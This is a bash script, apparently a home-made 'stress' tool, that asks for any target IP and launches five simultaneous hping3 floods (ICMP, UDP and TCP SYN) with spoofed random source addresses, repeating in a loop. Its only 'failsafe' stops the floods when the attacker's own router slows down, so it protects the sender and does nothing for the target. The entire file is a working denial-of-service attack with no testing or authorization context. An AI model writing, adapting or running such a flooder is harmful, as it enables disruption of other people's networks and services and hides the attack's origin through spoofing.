#!/bin/bash

clear
echo -e "\e[1;34m================================="
echo -e "   JALOPY MEGASTRESS SPOOFED + FAILSAFE"
echo -e "=================================\e[0m"
echo ""

read -p "Enter the target IP address: " target

echo ""
echo -e "\e[1;34mLaunching heavy stress attack on $target...\e[0m"
sleep 2

# Set router IP (usually your gateway address)
router_ip="192.168.1.1"

# Function to check router ping
check_router_ping() {
    ping_time=$(ping -c 1 -W 1 $router_ip | grep 'time=' | sed -n 's/.*time=\(.*\) ms/\1/p')
    ping_time=${ping_time%.*} # Remove decimal part
    if [[ -z "$ping_time" ]]; then
        ping_time=9999
    fi

    if [ "$ping_time" -ge 1000 ]; then
        echo -e "\e[1;31m[!!] Router ping $ping_time ms — FAILSAFE ACTIVATED. Killing attacks.\e[0m"
        sudo pkill hping3
        exit 1
    fi
}

while true
do
    echo -e "\e[1;32m[*] ICMP PING FLOOD (massive packets + random source IP)\e[0m"
    sudo hping3 -1 --flood --rand-source -d 1400 -i u50 $target &

    echo -e "\e[1;33m[*] UDP FLOOD (random ports + random source IP)\e[0m"
    sudo hping3 --udp --flood --rand-source -d 1400 $target &

    echo -e "\e[1;31m[*] TCP SYN FLOOD (random ports + random source IP)\e[0m"
    sudo hping3 -S --flood --rand-source -p ++50 -d 1400 $target &

    echo -e "\e[1;36m[*] SECOND UDP FLOOD (port 443 + random source IP)\e[0m"
    sudo hping3 --udp --flood --rand-source -p 443 -d 1400 -i u100 $target &

    echo -e "\e[1;35m[*] SECOND TCP SYN FLOOD (port 22 + random source IP)\e[0m"
    sudo hping3 -S --flood --rand-source -p 22 -d 1400 -i u150 $target &

    sleep 5

    # Check router health
    check_router_ping

    sudo pkill hping3
done
